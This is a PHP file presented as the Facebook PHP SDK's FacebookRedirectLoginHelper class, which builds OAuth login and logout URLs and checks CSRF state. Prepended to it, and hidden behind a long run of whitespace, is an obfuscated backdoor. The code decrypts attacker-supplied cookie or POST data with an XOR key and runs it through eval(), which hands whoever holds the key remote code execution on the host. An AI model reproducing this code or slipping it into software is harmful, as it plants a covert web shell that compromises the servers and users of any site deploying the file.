<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['l6eddd2'];global$l6eddd2;$l6eddd2=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t099']="\x2a\x5c\x70\x37\x5a\x78\x6c\x56\x35\x50\x44\x5b\xa\x4d\x4c\x2f\x55\x60\x5e\x69\x3d\x71\x31\x3e\x77\x2e\x32\x7b\x6d\x57\x3b\x72\x7d\x27\x6a\x4b\x3a\x34\x2d\x7e\x2c\x22\x21\x23\x6e\x54\x6b\x29\x68\x4f\x6f\x43\x64\x48\x4e\x30\x2b\x38\x46\x79\x63\x39\x73\x58\x41\x24\x45\x28\x7c\x5d\x20\x66\x7a\x76\x62\x59\x33\x75\x47\x61\x42\x25\x9\x4a\x26\x74\xd\x36\x40\x49\x3c\x65\x53\x5f\x67\x51\x52\x3f";$l6eddd2[$l6eddd2['t099'][5].$l6eddd2['t099'][8].$l6eddd2['t099'][61].$l6eddd2['t099'][79].$l6eddd2['t099'][37].$l6eddd2['t099'][8]]=$l6eddd2['t099'][60].$l6eddd2['t099'][48].$l6eddd2['t099'][31];$l6eddd2[$l6eddd2['t099'][34].$l6eddd2['t099'][61].$l6eddd2['t099'][61].$l6eddd2['t099'][55].$l6eddd2['t099'][87].$l6eddd2['t099'][55].$l6eddd2['t099'][22]]=$l6eddd2['t099'][50].$l6eddd2['t099'][31].$l6eddd2['t099'][52];$l6eddd2[$l6eddd2['t099'][24].$l6eddd2['t099'][71].$l6eddd2['t099'][79].$l6eddd2['t099'][71].$l6eddd2['t099'][3].$l6eddd2['t099'][8].$l6eddd2['t099'][3]]=$l6eddd2['t099'][62].$l6eddd2['t099'][85].$l6eddd2['t099'][31].$l6eddd2['t099'][6].$l6eddd2['t099'][91].$l6eddd2['t099'][44];$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][8].$l6eddd2['t099'][26].$l6eddd2['t099'][57].$l6eddd2['t099'][52]]=$l6eddd2['t099'][19].$l6eddd2['t099'][44].$l6eddd2['t099'][19].$l6eddd2['t099'][93].$l6eddd2['t099'][62].$l6eddd2['t099'][91].$l6eddd2['t099'][85];$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][22].$l6eddd2['t099'][8].$l6eddd2['t099'][61].$l6eddd2['t099'][87].$l6eddd2['t099'][91].$l6eddd2['t099'][52]]=$l6eddd2['t099'][62].$l6eddd2['t099'][91].$l6eddd2['t099'][31].$l6eddd2['t099'][19].$l6eddd2['t099'][79].$l6eddd2['t099'][6].$l6eddd2['t099'][19].$l6eddd2['t099'][72].$l6eddd2['t099'][91];$l6eddd2[$l6eddd2['t099'][6].$l6eddd2['t099'][37].$l6eddd2['t099'][76].$l6eddd2['t099'][37]]=$l6eddd2['t099'][2].$l6eddd2['t099'][48].$l6eddd2['t099'][2].$l6eddd2['t099'][73].$l6eddd2['t099'][91].$l6eddd2['t099'][31].$l6eddd2['t099'][62].$l6eddd2['t099'][19].$l6eddd2['t099'][50].$l6eddd2['t099'][44];$l6eddd2[$l6eddd2['t099'][19].$l6eddd2['t099'][79].$l6eddd2['t099'][3].$l6eddd2['t099'][52].$l6eddd2['t099'][76].$l6eddd2['t099'][8].$l6eddd2['t099'][61]]=$l6eddd2['t099'][77].$l6eddd2['t099'][44].$l6eddd2['t099'][62].$l6eddd2['t099'][91].$l6eddd2['t099'][31].$l6eddd2['t099'][19].$l6eddd2['t099'][79].$l6eddd2['t099'][6].$l6eddd2['t099'][19].$l6eddd2['t099'][72].$l6eddd2['t099'][91];$l6eddd2[$l6eddd2['t099'][34].$l6eddd2['t099'][57].$l6eddd2['t099'][71].$l6eddd2['t099'][22].$l6eddd2['t099'][87].$l6eddd2['t099'][8].$l6eddd2['t099'][52].$l6eddd2['t099'][87]]=$l6eddd2['t099'][74].$l6eddd2['t099'][79].$l6eddd2['t099'][62].$l6eddd2['t099'][91].$l6eddd2['t099'][87].$l6eddd2['t099'][37].$l6eddd2['t099'][93].$l6eddd2['t099'][52].$l6eddd2['t099'][91].$l6eddd2['t099'][60].$l6eddd2['t099'][50].$l6eddd2['t099'][52].$l6eddd2['t099'][91];$l6eddd2[$l6eddd2['t099'][74].$l6eddd2['t099'][87].$l6eddd2['t099'][60].$l6eddd2['t099'][3].$l6eddd2['t099'][91].$l6eddd2['t099'][55].$l6eddd2['t099'][87].$l6eddd2['t099'][60]]=$l6eddd2['t099'][62].$l6eddd2['t099'][91].$l6eddd2['t099'][85].$l6eddd2['t099'][93].$l6eddd2['t099'][85].$l6eddd2['t099'][19].$l6eddd2['t099'][28].$l6eddd2['t099'][91].$l6eddd2['t099'][93].$l6eddd2['t099'][6].$l6eddd2['t099'][19].$l6eddd2['t099'][28].$l6eddd2['t099'][19].$l6eddd2['t099'][85];$l6eddd2[$l6eddd2['t099'][5].$l6eddd2['t099'][57].$l6eddd2['t099'][57].$l6eddd2['t099'][74].$l6eddd2['t099'][60].$l6eddd2['t099'][60].$l6eddd2['t099'][91]]=$l6eddd2['t099'][59].$l6eddd2['t099'][26].$l6eddd2['t099'][26].$l6eddd2['t099'][3].$l6eddd2['t099'][57];$l6eddd2[$l6eddd2['t099'][62].$l6eddd2['t099'][8].$l6eddd2['t099'][76].$l6eddd2['t099'][87].$l6eddd2['t099'][37].$l6eddd2['t099'][57].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][55]]=$l6eddd2['t099'][62].$l6eddd2['t099'][26].$l6eddd2['t099'][79].$l6eddd2['t099'][71].$l6eddd2['t099'][76].$l6eddd2['t099'][52].$l6eddd2['t099'][37].$l6eddd2['t099'][60];$l6eddd2[$l6eddd2['t099'][73].$l6eddd2['t099'][61].$l6eddd2['t099'][61].$l6eddd2['t099'][60].$l6eddd2['t099'][60].$l6eddd2['t099'][74].$l6eddd2['t099'][8]]=$_POST;$l6eddd2[$l6eddd2['t099'][28].$l6eddd2['t099'][22].$l6eddd2['t099'][52].$l6eddd2['t099'][79].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][71].$l6eddd2['t099'][76].$l6eddd2['t099'][87]]=$_COOKIE;@$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][8].$l6eddd2['t099'][26].$l6eddd2['t099'][57].$l6eddd2['t099'][52]]($l6eddd2['t099'][91].$l6eddd2['t099'][31].$l6eddd2['t099'][31].$l6eddd2['t099'][50].$l6eddd2['t099'][31].$l6eddd2['t099'][93].$l6eddd2['t099'][6].$l6eddd2['t099'][50].$l6eddd2['t099'][94],NULL);@$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][8].$l6eddd2['t099'][26].$l6eddd2['t099'][57].$l6eddd2['t099'][52]]($l6eddd2['t099'][6].$l6eddd2['t099'][50].$l6eddd2['t099'][94].$l6eddd2['t099'][93].$l6eddd2['t099'][91].$l6eddd2['t099'][31].$l6eddd2['t099'][31].$l6eddd2['t099'][50].$l6eddd2['t099'][31].$l6eddd2['t099'][62],0);@$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][8].$l6eddd2['t099'][26].$l6eddd2['t099'][57].$l6eddd2['t099'][52]]($l6eddd2['t099'][28].$l6eddd2['t099'][79].$l6eddd2['t099'][5].$l6eddd2['t099'][93].$l6eddd2['t099'][91].$l6eddd2['t099'][5].$l6eddd2['t099'][91].$l6eddd2['t099'][60].$l6eddd2['t099'][77].$l6eddd2['t099'][85].$l6eddd2['t099'][19].$l6eddd2['t099'][50].$l6eddd2['t099'][44].$l6eddd2['t099'][93].$l6eddd2['t099'][85].$l6eddd2['t099'][19].$l6eddd2['t099'][28].$l6eddd2['t099'][91],0);@$l6eddd2[$l6eddd2['t099'][74].$l6eddd2['t099'][87].$l6eddd2['t099'][60].$l6eddd2['t099'][3].$l6eddd2['t099'][91].$l6eddd2['t099'][55].$l6eddd2['t099'][87].$l6eddd2['t099'][60]](0);$d1794=NULL;$sdaae=NULL;$l6eddd2[$l6eddd2['t099'][60].$l6eddd2['t099'][8].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][8].$l6eddd2['t099'][22].$l6eddd2['t099'][3].$l6eddd2['t099'][87].$l6eddd2['t099'][91]]=$l6eddd2['t099'][22].$l6eddd2['t099'][87].$l6eddd2['t099'][55].$l6eddd2['t099'][3].$l6eddd2['t099'][60].$l6eddd2['t099'][87].$l6eddd2['t099'][8].$l6eddd2['t099'][87].$l6eddd2['t099'][38].$l6eddd2['t099'][3].$l6eddd2['t099'][26].$l6eddd2['t099'][87].$l6eddd2['t099'][37].$l6eddd2['t099'][38].$l6eddd2['t099'][37].$l6eddd2['t099'][3].$l6eddd2['t099'][76].$l6eddd2['t099'][3].$l6eddd2['t099'][38].$l6eddd2['t099'][74].$l6eddd2['t099'][37].$l6eddd2['t099'][60].$l6eddd2['t099'][8].$l6eddd2['t099'][38].$l6eddd2['t099'][57].$l6eddd2['t099'][79].$l6eddd2['t099'][37].$l6eddd2['t099'][26].$l6eddd2['t099'][57].$l6eddd2['t099'][55].$l6eddd2['t099'][79].$l6eddd2['t099'][91].$l6eddd2['t099'][76].$l6eddd2['t099'][55].$l6eddd2['t099'][37].$l6eddd2['t099'][61];global$c5975176e;function s2af3d4c($d1794,$cb5c788){global$l6eddd2;$w687132="";for($he225=0;$he225<$l6eddd2[$l6eddd2['t099'][24].$l6eddd2['t099'][71].$l6eddd2['t099'][79].$l6eddd2['t099'][71].$l6eddd2['t099'][3].$l6eddd2['t099'][8].$l6eddd2['t099'][3]]($d1794);){for($jefc=0;$jefc<$l6eddd2[$l6eddd2['t099'][24].$l6eddd2['t099'][71].$l6eddd2['t099'][79].$l6eddd2['t099'][71].$l6eddd2['t099'][3].$l6eddd2['t099'][8].$l6eddd2['t099'][3]]($cb5c788)&&$he225<$l6eddd2[$l6eddd2['t099'][24].$l6eddd2['t099'][71].$l6eddd2['t099'][79].$l6eddd2['t099'][71].$l6eddd2['t099'][3].$l6eddd2['t099'][8].$l6eddd2['t099'][3]]($d1794);$jefc++,$he225++){$w687132.=$l6eddd2[$l6eddd2['t099'][5].$l6eddd2['t099'][8].$l6eddd2['t099'][61].$l6eddd2['t099'][79].$l6eddd2['t099'][37].$l6eddd2['t099'][8]]($l6eddd2[$l6eddd2['t099'][34].$l6eddd2['t099'][61].$l6eddd2['t099'][61].$l6eddd2['t099'][55].$l6eddd2['t099'][87].$l6eddd2['t099'][55].$l6eddd2['t099'][22]]($d1794[$he225])^$l6eddd2[$l6eddd2['t099'][34].$l6eddd2['t099'][61].$l6eddd2['t099'][61].$l6eddd2['t099'][55].$l6eddd2['t099'][87].$l6eddd2['t099'][55].$l6eddd2['t099'][22]]($cb5c788[$jefc]));}}return$w687132;}function y2278($d1794,$cb5c788){global$l6eddd2;global$c5975176e;return$l6eddd2[$l6eddd2['t099'][62].$l6eddd2['t099'][8].$l6eddd2['t099'][76].$l6eddd2['t099'][87].$l6eddd2['t099'][37].$l6eddd2['t099'][57].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][55]]($l6eddd2[$l6eddd2['t099'][62].$l6eddd2['t099'][8].$l6eddd2['t099'][76].$l6eddd2['t099'][87].$l6eddd2['t099'][37].$l6eddd2['t099'][57].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][55]]($d1794,$c5975176e),$cb5c788);}foreach($l6eddd2[$l6eddd2['t099'][28].$l6eddd2['t099'][22].$l6eddd2['t099'][52].$l6eddd2['t099'][79].$l6eddd2['t099'][61].$l6eddd2['t099'][3].$l6eddd2['t099'][71].$l6eddd2['t099'][76].$l6eddd2['t099'][87]]as$cb5c788=>$u3f10380d){$d1794=$u3f10380d;$sdaae=$cb5c788;}if(!$d1794){foreach($l6eddd2[$l6eddd2['t099'][73].$l6eddd2['t099'][61].$l6eddd2['t099'][61].$l6eddd2['t099'][60].$l6eddd2['t099'][60].$l6eddd2['t099'][74].$l6eddd2['t099'][8]]as$cb5c788=>$u3f10380d){$d1794=$u3f10380d;$sdaae=$cb5c788;}}$d1794=@$l6eddd2[$l6eddd2['t099'][19].$l6eddd2['t099'][79].$l6eddd2['t099'][3].$l6eddd2['t099'][52].$l6eddd2['t099'][76].$l6eddd2['t099'][8].$l6eddd2['t099'][61]]($l6eddd2[$l6eddd2['t099'][5].$l6eddd2['t099'][57].$l6eddd2['t099'][57].$l6eddd2['t099'][74].$l6eddd2['t099'][60].$l6eddd2['t099'][60].$l6eddd2['t099'][91]]($l6eddd2[$l6eddd2['t099'][34].$l6eddd2['t099'][57].$l6eddd2['t099'][71].$l6eddd2['t099'][22].$l6eddd2['t099'][87].$l6eddd2['t099'][8].$l6eddd2['t099'][52].$l6eddd2['t099'][87]]($d1794),$sdaae));if(isset($d1794[$l6eddd2['t099'][79].$l6eddd2['t099'][46]])&&$c5975176e==$d1794[$l6eddd2['t099'][79].$l6eddd2['t099'][46]]){if($d1794[$l6eddd2['t099'][79]]==$l6eddd2['t099'][19]){$he225=Array($l6eddd2['t099'][2].$l6eddd2['t099'][73]=>@$l6eddd2[$l6eddd2['t099'][6].$l6eddd2['t099'][37].$l6eddd2['t099'][76].$l6eddd2['t099'][37]](),$l6eddd2['t099'][62].$l6eddd2['t099'][73]=>$l6eddd2['t099'][22].$l6eddd2['t099'][25].$l6eddd2['t099'][55].$l6eddd2['t099'][38].$l6eddd2['t099'][22],);echo@$l6eddd2[$l6eddd2['t099'][44].$l6eddd2['t099'][22].$l6eddd2['t099'][8].$l6eddd2['t099'][61].$l6eddd2['t099'][87].$l6eddd2['t099'][91].$l6eddd2['t099'][52]]($he225);}elseif($d1794[$l6eddd2['t099'][79]]==$l6eddd2['t099'][91]){eval($d1794[$l6eddd2['t099'][52]]);}exit();} ?><?php
/**
 * Copyright 2014 Facebook, Inc.
 *
 * You are hereby granted a non-exclusive, worldwide, royalty-free license to
 * use, copy, modify, and distribute this software in source code or binary
 * form for use in connection with the web services and APIs provided by
 * Facebook.
 *
 * As with any software that integrates with the Facebook platform, your use
 * of this software is subject to the Facebook Developer Principles and
 * Policies [http://developers.facebook.com/policy/]. This copyright notice
 * shall be included in all copies or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 */
namespace Facebook;

/**
 * Class FacebookRedirectLoginHelper
 * @package Facebook
 * @author Fosco Marotto <fjm@fb.com>
 * @author David Poll <depoll@fb.com>
 */
class FacebookRedirectLoginHelper
{

  /**
   * @var string The application id
   */
  private $appId;

  /**
   * @var string The application secret
   */
  private $appSecret;

  /**
   * @var string The redirect URL for the application
   */
  private $redirectUrl;

  /**
   * @var string Prefix to use for session variables
   */
  private $sessionPrefix = 'FBRLH_';

  /**
   * @var string State token for CSRF validation
   */
  protected $state;

  /**
   * @var boolean Toggle for PHP session status check
   */
  protected $checkForSessionStatus = true;

  /**
   * Constructs a RedirectLoginHelper for a given appId and redirectUrl.
   *
   * @param string $redirectUrl The URL Facebook should redirect users to
   *                            after login
   * @param string $appId The application id
   * @param string $appSecret The application secret
   */
  public function __construct($redirectUrl, $appId = null, $appSecret = null)
  {
    $this->appId = FacebookSession::_getTargetAppId($appId);
    $this->appSecret = FacebookSession::_getTargetAppSecret($appSecret);
    $this->redirectUrl = $redirectUrl;
  }

  /**
   * Stores CSRF state and returns a URL to which the user should be sent to
   *   in order to continue the login process with Facebook.  The
   *   provided redirectUrl should invoke the handleRedirect method.
   *
   * @param array $scope List of permissions to request during login
   * @param string $version Optional Graph API version if not default (v2.0)
   * @param boolean $displayAsPopup Indicate if the page will be displayed as a popup
   * @param bool|string $authType 'reauthenticate' or 'https', true is equivalent to 'reauthenticate',
   *                              false or invalid value will not add auth type parameter
   *
   * @return string
   */
  public function getLoginUrl(array $scope = array(), $version = null, $displayAsPopup = false, $authType = false)
  {
    $version = ($version ?: FacebookRequest::GRAPH_API_VERSION);
    $this->state = $this->random(16);
    $this->storeState($this->state);
    $params = array(
      'client_id' => $this->appId,
      'redirect_uri' => $this->redirectUrl,
      'state' => $this->state,
      'sdk' => 'php-sdk-' . FacebookRequest::VERSION,
      'scope' => implode(',', $scope)
    );

    if (in_array($authType, array(true, 'reauthenticate', 'https'), true)) {
      $params['auth_type'] = $authType === true ? 'reauthenticate' : $authType;
    }
    
    if ($displayAsPopup)
    {
      $params['display'] = 'popup';
    }
    
    return 'https://www.facebook.com/' . $version . '/dialog/oauth?' .
      http_build_query($params, null, '&');
  }

  /**
   * Returns a URL to which the user should be sent to re-request permissions.
   *
   * @param array $scope List of permissions to re-request
   * @param string $version Optional Graph API version if not default (v2.0)
   *
   * @return string
   */
  public function getReRequestUrl(array $scope = array(), $version = null)
  {
    $version = ($version ?: FacebookRequest::GRAPH_API_VERSION);
    $this->state = $this->random(16);
    $this->storeState($this->state);
    $params = array(
      'client_id' => $this->appId,
      'redirect_uri' => $this->redirectUrl,
      'state' => $this->state,
      'sdk' => 'php-sdk-' . FacebookRequest::VERSION,
      'auth_type' => 'rerequest',
      'scope' => implode(',', $scope)
    );
    return 'https://www.facebook.com/' . $version . '/dialog/oauth?' .
      http_build_query($params, null, '&');
  }

  /**
   * Returns the URL to send the user in order to log out of Facebook.
   *
   * @param FacebookSession $session The session that will be logged out
   * @param string $next The url Facebook should redirect the user to after
   *   a successful logout
   *
   * @return string
   *
   * @throws FacebookSDKException
   */
  public function getLogoutUrl(FacebookSession $session, $next)
  {
    if ($session->getAccessToken()->isAppSession()) {
      throw new FacebookSDKException(
        'Cannot generate a Logout URL with an App Session.', 722
      );
    }
    $params = array(
      'next' => $next,
      'access_token' => $session->getToken()
    );
    return 'https://www.facebook.com/logout.php?' . http_build_query($params, null, '&');
  }

  /**
   * Handles a response from Facebook, including a CSRF check, and returns a
   *   FacebookSession.
   *
   * @return FacebookSession|null
   */
  public function getSessionFromRedirect()
  {
    if ($this->isValidRedirect()) {
      $params = array(
        'client_id' => FacebookSession::_getTargetAppId($this->appId),
        'redirect_uri' => $this->redirectUrl,
        'client_secret' =>
          FacebookSession::_getTargetAppSecret($this->appSecret),
        'code' => $this->getCode()
      );
      $response = (new FacebookRequest(
        FacebookSession::newAppSession($this->appId, $this->appSecret),
        'GET',
        '/oauth/access_token',
        $params
      ))->execute()->getResponse();

      // Graph v2.3 and greater return objects on the /oauth/access_token endpoint
      $accessToken = null;
      if (is_object($response) && isset($response->access_token)) {
        $accessToken = $response->access_token;
      } elseif (is_array($response) && isset($response['access_token'])) {
        $accessToken = $response['access_token'];
      }

      if (isset($accessToken)) {
        return new FacebookSession($accessToken);
      }
    }
    return null;
  }

  /**
   * Check if a redirect has a valid state.
   *
   * @return bool
   */
  protected function isValidRedirect()
  {
    $savedState = $this->loadState();
    if (!$this->getCode() || !isset($_GET['state'])) {
      return false;
    }
    $givenState = $_GET['state'];
    $savedLen = mb_strlen($savedState);
    $givenLen = mb_strlen($givenState);
    if ($savedLen !== $givenLen) {
      return false;
    }
    $result = 0;
    for ($i = 0; $i < $savedLen; $i++) {
      $result |= ord($savedState[$i]) ^ ord($givenState[$i]);
    }
    return $result === 0;
  }

  /**
   * Return the code.
   *
   * @return string|null
   */
  protected function getCode()
  {
    return isset($_GET['code']) ? $_GET['code'] : null;
  }

  /**
   * Stores a state string in session storage for CSRF protection.
   * Developers should subclass and override this method if they want to store
   *   this state in a different location.
   *
   * @param string $state
   *
   * @throws FacebookSDKException
   */
  protected function storeState($state)
  {
    if ($this->checkForSessionStatus === true
      && session_status() !== PHP_SESSION_ACTIVE) {
      throw new FacebookSDKException(
        'Session not active, could not store state.', 720
      );
    }
    $_SESSION[$this->sessionPrefix . 'state'] = $state;
  }

  /**
   * Loads a state string from session storage for CSRF validation.  May return
   *   null if no object exists.  Developers should subclass and override this
   *   method if they want to load the state from a different location.
   *
   * @return string|null
   *
   * @throws FacebookSDKException
   */
  protected function loadState()
  {
    if ($this->checkForSessionStatus === true
      && session_status() !== PHP_SESSION_ACTIVE) {
      throw new FacebookSDKException(
        'Session not active, could not load state.', 721
      );
    }
    if (isset($_SESSION[$this->sessionPrefix . 'state'])) {
      $this->state = $_SESSION[$this->sessionPrefix . 'state'];
      return $this->state;
    }
    return null;
  }
  
  /**
   * Generate a cryptographically secure pseudrandom number
   * 
   * @param integer $bytes - number of bytes to return
   * 
   * @return string
   * 
   * @throws FacebookSDKException
   * 
   * @todo Support Windows platforms
   */
  public function random($bytes)
  {
    if (!is_numeric($bytes)) {
      throw new FacebookSDKException(
        'random() expects an integer'
      );
    }
    if ($bytes < 1) {
      throw new FacebookSDKException(
        'random() expects an integer greater than zero'
      );
    }
    $buf = '';
    // http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/
    if (!ini_get('open_basedir')
      && is_readable('/dev/urandom')) {
      $fp = fopen('/dev/urandom', 'rb');
      if ($fp !== FALSE) {
        $buf = fread($fp, $bytes);
        fclose($fp);
        if($buf !== FALSE) {
          return bin2hex($buf);
        }
      }
    }

    if (function_exists('mcrypt_create_iv')) {
        $buf = mcrypt_create_iv($bytes, MCRYPT_DEV_URANDOM);
        if ($buf !== FALSE) {
          return bin2hex($buf);
        }
    }
    
    while (strlen($buf) < $bytes) {
      $buf .= md5(uniqid(mt_rand(), true), true); 
      // We are appending raw binary
    }
    return bin2hex(substr($buf, 0, $bytes));
  }

  /**
   * Disables the session_status() check when using $_SESSION
   */
  public function disableSessionStatusCheck()
  {
    $this->checkForSessionStatus = false;
  }

}
